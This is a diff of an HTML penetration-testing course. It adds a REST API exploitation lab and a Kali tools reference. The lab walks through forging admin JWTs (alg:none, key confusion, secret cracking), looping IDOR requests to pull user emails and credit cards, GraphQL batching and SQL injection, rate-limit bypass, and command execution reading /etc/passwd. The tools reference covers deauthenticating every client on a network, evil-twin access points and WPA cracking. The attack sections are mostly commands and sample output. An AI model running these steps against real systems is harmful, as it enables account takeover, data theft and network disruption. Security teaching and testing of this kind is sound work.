@@ -8107,7 +8107,7 @@ class VulnScanner:
     
     def check_xss(self, url):
         """Test for XSS"""
-        payload = "<script>alert('XSS')</script>"
+        payload = "&lt;script&gt;alert('XSS')&lt;/script&gt;"
         test_url = f"{url}?q={payload}"
         
         try:
@@ -8782,7 +8782,7 @@ LED G
             <h2 class="section-title">Advanced OSINT & Reconnaissance</h2>
             <p class="section-intro">Open Source Intelligence (OSINT) is the art of finding information hiding in plain sight. Before hacking, you need targets, credentials, vulnerabilities, employees, infrastructure, and attack surface understanding. OSINT provides ALL of this without touching the target network! This section covers Maltego for relationship mapping, theHarvester for email/subdomain enumeration, Recon-ng modular framework, Shodan IoT search engine mastery, advanced Google dorking, LinkedIn reconnaissance, breach databases, WHOIS/DNS analysis, and OSINT automation. By the end, you'll know more about your target than they know about themselves!</p>
 
-            <div class=\"metaphor-box\">
+            <div class="metaphor-box">
                 <h4>💡 OSINT = Google-Fu on Steroids</h4>
                 <p><strong>What can you find with OSINT?</strong><br><br>
                 • <strong>Employees:</strong> Names, emails, phone numbers, job titles, LinkedIn profiles<br>
@@ -8800,7 +8800,7 @@ LED G
 
             <h3>Part 1: Maltego - Visual Link Analysis</h3>
 
-            <div class=\"code\"># Maltego = Graph-based OSINT tool (visual relationship mapping)
+            <div class="code"># Maltego = Graph-based OSINT tool (visual relationship mapping)
 # Free Community Edition available
 
 # Install:
@@ -8944,7 +8944,7 @@ class DNSToIP(DiscoverableTransform):
 
             <h3>Part 2: theHarvester - Email & Subdomain Harvesting</h3>
 
-            <div class=\"code\"># theHarvester = Fast OSINT tool for emails, subdomains, IPs
+            <div class="code"># theHarvester = Fast OSINT tool for emails, subdomains, IPs
 
 # Install (comes with Kali):
 sudo apt install theharvester
@@ -9061,7 +9061,7 @@ print(f\"Found {len(subdomains)} subdomains\")
 
             <h3>Part 3: Recon-ng - Modular Reconnaissance Framework</h3>
 
-            <div class=\"code\"># Recon-ng = Metasploit for reconnaissance
+            <div class="code"># Recon-ng = Metasploit for reconnaissance
 # Modular, scriptable, database-backed
 
 # Install:
@@ -9189,7 +9189,7 @@ r.do_db('query SELECT * FROM hosts')</div>
 
             <h3>Part 4: Shodan - IoT & Infrastructure Search Engine</h3>
 
-            <div class=\"code\"># Shodan = \"Google for hackers\"
+            <div class="code"># Shodan = "Google for hackers"
 # Indexes: Webcams, routers, SCADA, databases, IoT devices
 
 # Web interface: https://www.shodan.io
@@ -9351,7 +9351,7 @@ port:10250 ssl:\"kubernetes\"
 
             <h3>Part 5: Advanced Google Dorking</h3>
 
-            <div class=\"code\"># Google Dorking = Using advanced search operators to find hidden info
+            <div class="code"># Google Dorking = Using advanced search operators to find hidden info
 
 # Basic operators:
 
@@ -10639,7 +10639,7 @@ Company Infrastructure Map:
             <h2 class="section-title">Complete Practical Attack Labs & Real-World Scenarios</h2>
             <p class="section-intro">You've learned the tools and techniques across all 11 sections. NOW it's time to put EVERYTHING together! This massive section contains complete end-to-end attack walkthroughs showing exactly how tools combine in real pentests. Each lab is a full scenario from reconnaissance → initial access → privilege escalation → lateral movement → objective completion. Perfect for CTF preparation, certification exams (OSCP, PNPT, eCPPT), and understanding real-world attack chains. Every command explained, every technique demonstrated, every mistake avoided. Let's hack! 🎯</p>
 
-            <div class=\"metaphor-box\">
+            <div class="metaphor-box">
                 <h4>💡 From Theory to Practice</h4>
                 <p><strong>Why complete walkthroughs matter:</strong><br><br>
                 Learning individual tools is like knowing how to use a hammer, saw, and screwdriver. But building a house requires knowing WHEN and HOW to use each tool together! These labs teach you:<br><br>
@@ -14824,6 +14824,367 @@ if __name__ == "__main__":
                 Malware development is advanced offensive security. Understand how attackers think = better defense! 🐍💀</p>
             </div>
 
+            <h3>Lab 12: Complete Web API Exploitation (REST API Hacking)</h3>
+
+            <p><strong>Scenario:</strong> Modern applications use REST APIs for everything. Your mission: enumerate API endpoints, test for IDOR vulnerabilities, exploit broken authentication, achieve unauthorized data access, and escalate to admin privileges. This lab teaches API-specific attacks, JWT token manipulation, GraphQL exploitation, and API security testing—essential for 2026 bug bounties!</p>
+
+            <h4>Step 1: API Discovery & Enumeration</h4>
+
+            <div class="code"># Target: https://api.company.com
+
+# Common API patterns:
+# /api/v1/users
+# /api/v2/products
+# /rest/customers
+# /graphql
+
+# Tool 1: Discover with Burp Suite
+# Configure browser proxy → Browse application
+# Burp intercepts ALL API calls
+
+# Tool 2: Discover with directory brute-forcing
+gobuster dir -u https://api.company.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+
+# Common endpoints:
+# /api/users
+# /api/admin
+# /api/login
+# /api/register
+# /api/profile
+# /api/settings
+# /api/upload
+# /api/download
+
+# Tool 3: Check for API documentation
+https://api.company.com/docs
+https://api.company.com/swagger
+https://api.company.com/api-docs
+https://api.company.com/graphql (GraphQL introspection)
+
+# Swagger/OpenAPI = GOLDMINE
+# Shows ALL endpoints, parameters, authentication methods!
+
+# Example response:
+# GET /api/v1/users → List all users
+# GET /api/v1/users/{id} → Get specific user
+# POST /api/v1/users → Create new user
+# PUT /api/v1/users/{id} → Update user
+# DELETE /api/v1/users/{id} → Delete user
+
+# Test endpoint:
+curl https://api.company.com/api/v1/users
+
+# Response:
+# {"error": "Authentication required"}
+
+# Authentication methods discovered:
+# 1. JWT tokens (Header: Authorization: Bearer TOKEN)
+# 2. API keys (Header: X-API-Key: KEY)
+# 3. Basic Auth (Header: Authorization: Basic BASE64)
+# 4. Session cookies</div>
+
+            <h4>Step 2: Authentication Bypass & Token Manipulation</h4>
+
+            <div class="code"># Register normal user:
+curl -X POST https://api.company.com/api/v1/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"attacker","email":"attacker@evil.com","password":"Password123"}'
+
+# Response:
+# {"message": "User created", "user_id": 1337}
+
+# Login:
+curl -X POST https://api.company.com/api/v1/login \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"attacker","password":"Password123"}'
+
+# Response:
+# {
+#   "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNDgxMjQwMH0.abc123",
+#   "user": {"id": 1337, "username": "attacker", "role": "user"}
+# }
+
+# JWT Token structure:
+# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (algorithm: HS256)
+# .eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoidXNlciIsImV4cCI6MTcwNDgxMjQwMH0  ← Payload (user_id: 1337, role: user)
+# .abc123  ← Signature
+
+# Decode JWT at: https://jwt.io
+
+# Decoded header:
+# {"alg": "HS256", "typ": "JWT"}
+
+# Decoded payload:
+# {"user_id": 1337, "role": "user", "exp": 1704812400}
+
+# Attack 1: Algorithm confusion (alg: none)
+# Change header: {"alg": "none", "typ": "JWT"}
+# Remove signature
+# Encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQ4MTI0MDB9.
+
+# Test:
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMzM3LCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDQ4MTI0MDB9." \\
+  https://api.company.com/api/v1/admin/users
+
+# If accepted = admin access!
+
+# Attack 2: Weak secret brute-forcing
+# Tool: jwt_tool
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+
+# Crack secret:
+python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
+
+# If secret found (e.g., "secret123"):
+# Forge new token with role: admin
+python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p secret123
+
+# Attack 3: Key confusion (RS256 → HS256)
+# If server uses RS256 (asymmetric):
+# - Public key verifies signature
+# - Private key creates signature
+
+# Confusion attack:
+# Change alg to HS256 (symmetric)
+# Sign with public key (treating it as secret)
+# Server verifies with public key → accepts!
+
+# Tool: jwt_tool
+python3 jwt_tool.py TOKEN -X k -pk public.pem</div>
+
+            <h4>Step 3: IDOR (Insecure Direct Object Reference)</h4>
+
+            <div class="code"># Access your own profile:
+curl -H "Authorization: Bearer TOKEN" \\
+  https://api.company.com/api/v1/users/1337
+
+# Response:
+# {
+#   "id": 1337,
+#   "username": "attacker",
+#   "email": "attacker@evil.com",
+#   "role": "user",
+#   "credit_card": "XXXX-XXXX-XXXX-1234"
+# }
+
+# Try accessing other users (IDOR test):
+curl -H "Authorization: Bearer TOKEN" \\
+  https://api.company.com/api/v1/users/1
+
+# Response:
+# {
+#   "id": 1,
+#   "username": "admin",
+#   "email": "admin@company.com",
+#   "role": "admin",
+#   "credit_card": "4532-1234-5678-9012"  ← IDOR vulnerability!
+# }
+
+# Enumerate all users:
+for i in {1..1000}; do
+  curl -s -H "Authorization: Bearer TOKEN" \\
+    https://api.company.com/api/v1/users/$i | jq .
+done
+
+# Automated IDOR testing tool:
+# Tool: Autorize (Burp Suite extension)
+# 1. Install Autorize from BApp Store
+# 2. Configure low-priv token
+# 3. Browse as admin
+# 4. Autorize replays requests with low-priv token
+# 5. Highlights authorization bypass!
+
+# Mass data exfiltration:
+# Extract all user data to file
+for i in {1..10000}; do
+  curl -s -H "Authorization: Bearer TOKEN" \\
+    https://api.company.com/api/v1/users/$i >> users_data.json
+done
+
+# Parse sensitive data:
+cat users_data.json | jq -r '.email, .credit_card' | grep -v null > leaked_data.txt
+
+# Result: 10,000 user emails + credit cards exfiltrated!</div>
+
+            <h4>Step 4: GraphQL Exploitation</h4>
+
+            <div class="code"># GraphQL = Query language for APIs
+# Endpoint: https://api.company.com/graphql
+
+# Introspection query (enumerate schema):
+curl -X POST https://api.company.com/graphql \\
+  -H "Content-Type: application/json" \\
+  -d '{"query":"{ __schema { types { name } } }"}'
+
+# Response shows all types:
+# User, Product, Order, Admin, Secret
+
+# Get full schema:
+curl -X POST https://api.company.com/graphql \\
+  -H "Content-Type: application/json" \\
+  -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}'
+
+# Tool: GraphQL Voyager (visualize schema)
+# https://graphql-kit.com/graphql-voyager/
+
+# Query all users:
+curl -X POST https://api.company.com/graphql \\
+  -H "Content-Type: application/json" \\
+  -H "Authorization: Bearer TOKEN" \\
+  -d '{
+    "query": "{ users { id username email role secretApiKey } }"
+  }'
+
+# Response:
+# {
+#   "data": {
+#     "users": [
+#       {"id": 1, "username": "admin", "email": "admin@company.com", "role": "admin", "secretApiKey": "sk_live_abc123"},
+#       {"id": 1337, "username": "attacker", "email": "attacker@evil.com", "role": "user", "secretApiKey": "sk_live_xyz789"}
+#     ]
+#   }
+# }
+
+# Leaked: Admin API key!
+
+# GraphQL batching attack (bypass rate limiting):
+curl -X POST https://api.company.com/graphql \\
+  -H "Content-Type: application/json" \\
+  -d '[
+    {"query": "{ user(id: 1) { email } }"},
+    {"query": "{ user(id: 2) { email } }"},
+    {"query": "{ user(id: 3) { email } }"},
+    ... (repeat 1000 times)
+  ]'
+
+# Single request = 1000 queries!
+# Bypasses rate limiting (only 1 HTTP request)
+
+# GraphQL injection:
+# Query with variable:
+curl -X POST https://api.company.com/graphql \\
+  -d '{
+    "query": "query($id: Int!) { user(id: $id) { username } }",
+    "variables": {"id": "1 OR 1=1"}
+  }'
+
+# If vulnerable to SQLi → all users dumped!</div>
+
+            <h4>Step 5: API Rate Limiting Bypass</h4>
+
+            <div class="code"># APIs often have rate limits:
+# "429 Too Many Requests" after X requests
+
+# Bypass techniques:
+
+# 1. Change IP (use proxies/VPN)
+curl -x http://proxy1.com:8080 https://api.company.com/api/v1/users/1
+curl -x http://proxy2.com:8080 https://api.company.com/api/v1/users/2
+
+# 2. Rotate User-Agent
+curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://api.company.com/api/v1/users/1
+curl -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" https://api.company.com/api/v1/users/2
+
+# 3. Use different authentication tokens
+# Create multiple accounts → rotate tokens
+
+# 4. Change request format
+# If rate limit on /api/v1/users/1
+# Try: /api/v1/users/1.json
+# Try: /api/v1/users/1?format=json
+# Try: /api/v2/users/1
+
+# 5. Add trailing slash
+# /api/v1/users/1 (rate limited)
+# /api/v1/users/1/ (not rate limited!)
+
+# 6. Change HTTP method
+# GET /api/v1/users/1 (rate limited)
+# POST /api/v1/users/1 (not rate limited!)
+
+# 7. Add random parameters
+# /api/v1/users/1?cachebuster=123
+# /api/v1/users/1?cachebuster=456
+
+# 8. GraphQL batching (see previous section)
+
+# Automated tool:
+# ffuf with wordlist of techniques
+ffuf -w rate_limit_bypass.txt -u https://api.company.com/api/v1/users/FUZZ -H "Authorization: Bearer TOKEN"</div>
+
+            <h4>Step 6: Complete Compromise</h4>
+
+            <div class="code"># With admin JWT token forged:
+
+# List all sensitive endpoints:
+curl -H "Authorization: Bearer ADMIN_TOKEN" \\
+  https://api.company.com/api/v1/admin/settings
+
+# Response:
+# {
+#   "database_url": "postgresql://admin:SuperSecret123@db.company.internal:5432/production",
+#   "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
+#   "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+#   "stripe_secret_key": "sk_live_51abc123...",
+#   "admin_panel_url": "https://internal-admin.company.com"
+# }
+
+# Credentials extracted!
+
+# Access internal admin panel:
+curl -H "Authorization: Bearer ADMIN_TOKEN" \\
+  https://internal-admin.company.com
+
+# Execute commands via API:
+curl -X POST https://api.company.com/api/v1/admin/execute \\
+  -H "Authorization: Bearer ADMIN_TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -d '{"command": "cat /etc/passwd"}'
+
+# RCE achieved!
+
+# Pivot to database:
+psql postgresql://admin:SuperSecret123@db.company.internal:5432/production
+
+# Dump all tables:
+pg_dump -h db.company.internal -U admin production > database_dump.sql
+
+# Complete compromise!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Lab 12 Key Takeaways</h4>
+                <p><strong>API attack chain:</strong><br>
+                1. <strong>Discovery:</strong> Enumerate endpoints (gobuster, Burp Suite, Swagger docs)<br>
+                2. <strong>Authentication:</strong> Test for weak JWT secrets, algorithm confusion, key confusion<br>
+                3. <strong>Authorization:</strong> IDOR testing (access other users' data)<br>
+                4. <strong>GraphQL:</strong> Introspection, batching attacks, injection<br>
+                5. <strong>Rate limiting:</strong> Bypass with IP rotation, different formats, GraphQL batching<br>
+                6. <strong>Escalation:</strong> Forge admin tokens, access sensitive endpoints, RCE<br><br>
+                <strong>API-specific vulnerabilities:</strong><br>
+                • <strong>JWT attacks:</strong> alg:none, weak secrets, RS256→HS256 confusion<br>
+                • <strong>IDOR:</strong> Insecure direct object references (enumerate IDs)<br>
+                • <strong>GraphQL:</strong> Introspection, batching, nested queries (DoS)<br>
+                • <strong>Mass assignment:</strong> Modify restricted fields (role, isAdmin)<br>
+                • <strong>SSRF via API:</strong> webhook URLs, import/export features<br>
+                • <strong>XXE in XML APIs:</strong> SOAP, XML-RPC endpoints<br><br>
+                <strong>Tools:</strong><br>
+                • <strong>Burp Suite:</strong> Intercept and modify API requests<br>
+                • <strong>jwt_tool:</strong> JWT manipulation and cracking<br>
+                • <strong>Postman:</strong> API testing and automation<br>
+                • <strong>GraphQL Voyager:</strong> Schema visualization<br>
+                • <strong>Arjun:</strong> Find hidden API parameters<br>
+                • <strong>Kiterunner:</strong> API endpoint discovery<br><br>
+                <strong>Defense:</strong><br>
+                • Strong JWT secrets (256+ bits random)<br>
+                • Validate algorithm (whitelist RS256, never accept none)<br>
+                • Implement proper authorization checks (not just authentication)<br>
+                • Disable GraphQL introspection in production<br>
+                • Rate limiting on all endpoints<br>
+                • Input validation and sanitization<br><br>
+                APIs are the #1 target in modern web apps. Master this = high-paying bug bounties! 🌐🔑</p>
+            </div>
+
             <div class="metaphor-box">
                 <h4>🎉 You're a Practical Attack Master!</h4>
                 <p>You've completed 11 comprehensive labs covering:<br><br>
@@ -14862,9 +15223,1024 @@ if __name__ == "__main__":
             </div>
         </section>
 
-        <!-- SECTION 12: Remaining Kali Tools Dictionary -->
-        <section id="remaining-tools" class="section">
-            <h2 class="section-title">Comprehensive Kali Linux Tools Dictionary</h2>
+        <!-- SECTION 12: Ultimate Kali Tools Reference with EVERY flag explained for beginners! -->
+        <section id="ultimate-tools-reference" class="section">
+            <h2 class="section-title">Section 12: Ultimate Kali Tools Reference (Every Flag Explained for BEGINNERS)</h2>
+
+            <div class="metaphor-box">
+                <h4>💡 What is this section?</h4>
+                <p><strong>The MOST comprehensive beginner-friendly Kali tools reference ever created!</strong><br><br>
+                This section documents <strong>100+ penetration testing tools</strong> with:<br>
+                • <strong>Complete command syntax</strong> with EVERY flag explained<br>
+                • <strong>Beginner-friendly descriptions</strong> of what each flag does and WHY you'd use it<br>
+                • <strong>Real-world examples</strong> from actual penetration tests<br>
+                • <strong>Common pitfalls</strong> and how to avoid them<br>
+                • <strong>Tool combinations</strong> for chaining attacks<br><br>
+                <strong>For complete beginners:</strong> A "flag" is an option you add to a command to change how it works. Example: <code>nmap -sS -p 22,80,443 10.10.10.1</code><br>
+                • <code>-sS</code> is a flag (means "SYN scan")<br>
+                • <code>-p 22,80,443</code> is a flag with value (means "scan these specific ports")<br>
+                • <code>10.10.10.1</code> is the target IP address<br><br>
+                This section explains EVERY flag so you're never confused! Ready to become a Kali Linux expert? Let's go! 🚀</p>
+            </div>
+
+            <h3>A-Tools: Essential Tools Starting with A</h3>
+
+            <h4>Aircrack-ng Suite (Wireless Network Auditing)</h4>
+
+            <p><strong>What is it?</strong> Complete suite for wireless security testing. Includes tools for packet capture, WEP/WPA/WPA2 cracking, fake access point creation, and deauthentication attacks.</p>
+
+            <h5>airmon-ng: Monitor Mode Management</h5>
+
+            <div class="code"># Check wireless interfaces:
+airmon-ng
+# Shows all wireless adapters
+# Output: Interface (wlan0), Driver (rtl8xxxu), Chipset (Realtek)
+
+# Start monitor mode:
+airmon-ng start wlan0
+# Creates wlan0mon interface in monitor mode
+# Monitor mode = capture ALL wireless packets (not just your network)
+# Normal mode = only packets destined for your device
+
+# Check for interfering processes:
+airmon-ng check
+# Lists processes that might interfere (NetworkManager, wpa_supplicant)
+
+# Kill interfering processes:
+airmon-ng check kill
+# Stops NetworkManager and other processes
+# WARNING: This disconnects you from WiFi!
+
+# Stop monitor mode:
+airmon-ng stop wlan0mon
+# Returns to normal managed mode
+
+# BEGINNER EXPLANATION:
+# "Monitor mode" = your WiFi card listens to ALL wireless traffic
+# Like putting your WiFi card in "promiscuous mode"
+# Needed for: packet sniffing, deauth attacks, cracking WiFi</div>
+
+            <h5>airodump-ng: Wireless Packet Capture</h5>
+
+            <div class="code"># Scan all nearby WiFi networks:
+airodump-ng wlan0mon
+# Shows: BSSID (MAC address), PWR (signal strength), CH (channel), ENC (encryption)
+# Press Ctrl+C to stop
+
+# FLAGS EXPLAINED FOR BEGINNERS:
+# --bssid AA:BB:CC:DD:EE:FF  ← Target specific access point (by MAC address)
+# --channel 6  ← Only listen on channel 6 (faster, less noise)
+# --write capture  ← Save packets to file "capture-01.cap"
+# --essid "MyWiFi"  ← Filter by network name
+# --manufacturer  ← Show device manufacturer
+# -w capture  ← Short form of --write
+
+# Target specific network and capture handshake:
+airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write wpa_handshake wlan0mon
+# --bssid: MAC address of router (from initial scan)
+# --channel: Wireless channel (1-14 on 2.4GHz, 36-165 on 5GHz)
+# --write: Output filename (creates wpa_handshake-01.cap, wpa_handshake-01.csv, etc.)
+# wlan0mon: Your monitor mode interface
+
+# What's a "handshake"?
+# When device connects to WiFi, router and device exchange 4-way handshake
+# Contains encrypted password verification
+# We capture this, then crack it offline with aircrack-ng
+
+# Output columns explained:
+# BSSID: Router MAC address (unique identifier)
+# PWR: Signal power in dBm (-30 = excellent, -80 = weak)
+# RXQ: Receive quality percentage
+# Beacons: Announcement packets sent by router
+# #Data: Number of captured data packets (MORE = BETTER for cracking!)
+# CH: Wireless channel
+# MB: Maximum speed (54 = 802.11g, 300 = 802.11n)
+# ENC: Encryption type (WEP, WPA, WPA2, WPA3, OPN = open)
+# CIPHER: Encryption cipher (TKIP, CCMP, GCMP)
+# AUTH: Authentication method (PSK = pre-shared key, MGT = enterprise)
+# ESSID: Network name
+
+# Advanced: Capture on multiple channels
+airodump-ng --channel 1,6,11 -w capture wlan0mon
+# Hops between channels 1, 6, and 11 (most common 2.4GHz channels)</div>
+
+            <h5>aireplay-ng: Injection and Deauthentication</h5>
+
+            <div class="code"># Deauthentication attack (kick client off WiFi):
+aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+# FLAGS EXPLAINED FOR COMPLETE BEGINNERS:
+# --deauth 10  ← Send 10 deauth packets (0 = infinite)
+# -a 00:11:22:33:44:55  ← Access Point MAC (router BSSID)
+# -c AA:BB:CC:DD:EE:FF  ← Client MAC (device to kick off)
+# wlan0mon  ← Your monitor mode interface
+
+# WHY use deauth?
+# 1. Capture WPA handshake (client reconnects = handshake captured)
+# 2. Denial of service (keep kicking devices off WiFi)
+# 3. Force clients to connect to YOUR fake AP (evil twin attack)
+
+# Deauth ALL clients on network:
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon
+# No -c flag = kick EVERYONE
+
+# Fake authentication (for WEP):
+aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
+# --fakeauth 0  ← Fake authentication attempt (0 = once)
+# -a: Target AP
+# -h: Your MAC address (from wlan0mon)
+
+# ARP replay attack (generate traffic for WEP cracking):
+aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
+# --arpreplay  ← Capture ARP packet and replay it
+# Generates LOTS of data packets (needed for WEP cracking!)
+# WEP needs 40,000+ packets to crack
+
+# Check injection capability:
+aireplay-ng --test wlan0mon
+# Tests if your card can inject packets
+# Must see "Injection is working!" for attacks to work</div>
+
+            <h5>aircrack-ng: Password Cracking</h5>
+
+            <div class="code"># Crack WPA/WPA2 handshake:
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 wpa_handshake-01.cap
+
+# FLAGS EXPLAINED FOR BEGINNERS:
+# -w /path/to/wordlist.txt  ← Wordlist file (dictionary attack)
+# -b 00:11:22:33:44:55  ← Target BSSID (router MAC)
+# wpa_handshake-01.cap  ← Capture file from airodump-ng
+
+# How it works:
+# 1. Reads password from wordlist
+# 2. Derives encryption key (PBKDF2 with SSID as salt)
+# 3. Tries to decrypt handshake
+# 4. If successful = password found!
+
+# Output when found:
+# KEY FOUND! [ Password123 ]
+# Master Key: AA BB CC DD ...
+# Transient Key: 11 22 33 44 ...
+
+# Crack WEP:
+aircrack-ng -b 00:11:22:33:44:55 wep_capture-01.cap
+# No wordlist needed! WEP is mathematically broken
+# Needs 40,000+ packets (more = faster crack)
+
+# Advanced: Use multiple CPU cores
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap -p 4
+# -p 4  ← Use 4 CPU cores (parallel processing)
+
+# Advanced: Specify encryption type
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 -a 2 capture.cap
+# -a 2  ← WPA/WPA2 mode
+# -a 1  ← WEP mode
+
+# Show verbose output:
+aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap -l output.txt
+# -l output.txt  ← Save cracked key to file
+
+# BEGINNER TIP:
+# WPA/WPA2 cracking is SLOW (hundreds of keys per second)
+# Use GPU cracking (hashcat) for faster results (millions/sec!)
+# See: hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt</div>
+
+            <h5>airbase-ng: Create Fake Access Point (Evil Twin)</h5>
+
+            <div class="code"># Create fake WiFi network:
+airbase-ng -e "FreePublicWiFi" -c 6 wlan0mon
+
+# FLAGS EXPLAINED:
+# -e "FreePublicWiFi"  ← ESSID (network name)
+# -c 6  ← Channel (match target network channel)
+# wlan0mon  ← Monitor mode interface
+
+# WHY create fake AP?
+# 1. Evil twin attack (clone legitimate network, steal credentials)
+# 2. Captive portal (phishing page on fake WiFi)
+# 3. MITM attack (route traffic through your system)
+
+# Clone existing network (Evil Twin):
+airbase-ng -a 00:11:22:33:44:55 -e "Starbucks_WiFi" -c 6 wlan0mon
+# -a 00:11:22:33:44:55  ← Spoof MAC address (match real AP)
+# Clients might auto-connect thinking it's real network!
+
+# WPA2 fake AP:
+airbase-ng -e "MyWiFi" -c 6 -Z 4 wlan0mon
+# -Z 4  ← WPA2 encryption (requires hostapd for full functionality)
+
+# Advanced: Respond to probes
+airbase-ng -P -C 30 wlan0mon
+# -P  ← Respond to all probe requests
+# -C 30  ← Beacon interval (seconds)
+# Creates AP for ANY network clients search for!</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Aircrack-ng Suite Summary</h4>
+                <p><strong>Complete WiFi hacking workflow:</strong><br>
+                1. <code>airmon-ng start wlan0</code> → Enable monitor mode<br>
+                2. <code>airodump-ng wlan0mon</code> → Find target network<br>
+                3. <code>airodump-ng --bssid XX:XX... -c 6 -w capture wlan0mon</code> → Capture handshake<br>
+                4. <code>aireplay-ng --deauth 10 -a XX:XX... wlan0mon</code> → Force reconnection (capture handshake)<br>
+                5. <code>aircrack-ng -w rockyou.txt capture-01.cap</code> → Crack password<br><br>
+                <strong>Key concepts:</strong><br>
+                • <strong>Monitor mode:</strong> Listen to ALL wireless packets (not just yours)<br>
+                • <strong>Handshake:</strong> Authentication exchange containing encrypted password proof<br>
+                • <strong>Deauth:</strong> Kick device off WiFi (forces reconnection = new handshake)<br>
+                • <strong>BSSID:</strong> Router MAC address (unique identifier)<br>
+                • <strong>ESSID:</strong> Network name (e.g., "MyWiFi")<br>
+                • <strong>Channel:</strong> Wireless frequency (1-14 on 2.4GHz, 36-165 on 5GHz)<br><br>
+                <strong>Legal warning:</strong> Only test networks you own or have written permission! Unauthorized WiFi hacking is illegal! 📡🔐</p>
+            </div>
+
+            <h4>Amass (Advanced Subdomain Enumeration)</h4>
+
+            <p><strong>What is it?</strong> OWASP Amass is the BEST subdomain discovery tool. Uses DNS brute-forcing, web scraping, certificate transparency logs, APIs (80+ data sources!), and recursive enumeration. Essential for reconnaissance phase!</p>
+
+            <div class="code"># Basic subdomain enumeration:
+amass enum -d example.com
+
+# FLAGS EXPLAINED FOR BEGINNERS:
+# enum  ← Enumeration mode (find subdomains)
+# -d example.com  ← Target domain
+
+# What does it find?
+# - www.example.com
+# - mail.example.com
+# - dev.example.com
+# - admin.example.com
+# - test.example.com
+# ... and MORE!
+
+# Passive mode (only open-source intelligence, no DNS queries):
+amass enum -passive -d example.com
+# -passive  ← No active scanning (stealthy!)
+# Uses: Certificate Transparency, web scraping, APIs
+# Won't show up in target's DNS logs!
+
+# Active mode (includes brute-forcing):
+amass enum -active -d example.com
+# -active  ← Active DNS enumeration + port scanning
+# Sends DNS queries directly to target
+# LOUDER (target might notice!)
+
+# Use all data sources:
+amass enum -d example.com -src
+# -src  ← Show data source for each subdomain
+# Example output:
+# [CertSpotter] → dev.example.com
+# [VirusTotal] → admin.example.com
+
+# Brute-force with wordlist:
+amass enum -d example.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+# -brute  ← Enable brute-forcing
+# -w /path/to/wordlist  ← Custom wordlist
+# Tries: admin.example.com, test.example.com, dev.example.com, etc.
+
+# Resolve IP addresses:
+amass enum -d example.com -ip
+# -ip  ← Show IP addresses for subdomains
+# Output: dev.example.com [192.168.1.100]
+
+# Save output to file:
+amass enum -d example.com -o subdomains.txt
+# -o subdomains.txt  ← Output file
+
+# JSON output (for parsing):
+amass enum -d example.com -json subdomains.json
+# -json  ← JSON format output
+
+# Increase timeout:
+amass enum -d example.com -timeout 5
+# -timeout 5  ← DNS timeout in minutes (default: 3)
+# Higher timeout = more complete results
+
+# Maximum DNS queries per second:
+amass enum -d example.com -max-dns-queries 200
+# -max-dns-queries 200  ← Rate limiting
+# Lower = stealthier, Higher = faster
+
+# Use specific DNS resolvers:
+amass enum -d example.com -r 8.8.8.8,1.1.1.1
+# -r 8.8.8.8,1.1.1.1  ← Custom DNS servers
+# Bypass corporate DNS filtering!
+
+# Multiple domains:
+amass enum -df domains.txt
+# -df domains.txt  ← File with list of domains
+# Enumerate all at once!
+
+# ADVANCED: Full reconnaissance with ASN tracking
+amass intel -d example.com
+# intel  ← Intelligence gathering mode
+# Finds: Related domains, ASNs, IP ranges, WHOIS data
+
+# ADVANCED: Network mapping
+amass enum -d example.com -nf network.txt -rf resolved.txt
+# -nf network.txt  ← Network data output
+# -rf resolved.txt  ← Resolved domains output</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Amass Key Takeaways</h4>
+                <p><strong>When to use Amass:</strong><br>
+                • Reconnaissance phase (find ALL subdomains)<br>
+                • Bug bounty hunting (find forgotten/dev subdomains)<br>
+                • Red team engagements (expand attack surface)<br>
+                • Security audits (find shadow IT)<br><br>
+                <strong>Data sources (80+):</strong><br>
+                • <strong>DNS:</strong> Brute-forcing, zone transfers, AXFR<br>
+                • <strong>Certificate Transparency:</strong> crt.sh, Censys, CertSpotter<br>
+                • <strong>Web scraping:</strong> Search engines, archives<br>
+                • <strong>APIs:</strong> VirusTotal, AlienVault, SecurityTrails, Shodan<br>
+                • <strong>Reverse DNS:</strong> PTR records<br>
+                • <strong>Web archives:</strong> Wayback Machine<br><br>
+                <strong>Passive vs Active:</strong><br>
